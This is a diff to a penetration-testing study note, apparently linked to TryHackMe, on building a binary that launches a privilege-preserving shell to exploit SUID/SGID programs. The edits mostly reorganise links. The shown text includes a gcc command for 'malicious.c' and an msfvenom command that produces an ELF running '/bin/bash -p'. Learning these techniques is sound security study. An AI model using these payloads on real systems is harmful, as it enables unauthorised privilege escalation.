@@ -19,7 +19,7 @@ Compile with:
 gcc -fPIC -o /path/to/malicious /path/to/malicious.c
 ```
 
-Note that this is *almost* identical to the [LD_PRELOAD trick](exploiting-ld-preload.md); the differences are:
+Note that this is *almost* identical to the LD_PRELOAD trick; the differences are:
 
 * Use `main()` instead of `_init()` as our entry point.
 * Compile without -shared and -nostartfiles.
@@ -28,15 +28,18 @@ A simple binary like this is useful for exploiting SUID/SGID applications that c
 
 ## Metasploit
 
-The [msfvenom](metasploit.md) tool  can generate binaries with essentially the same functionality as above.
+The msfvenom tool can generate binaries with essentially the same functionality as above.
 
 ```bash
-msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf \
+         -o shell.elf
 ```
 
 ## References
 
 * [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)
+* [Exploiting LD_PRELOAD](exploiting-ld-preload.md)
+* [Using Metasploit](metasploit.md)
 
 - - - -
 
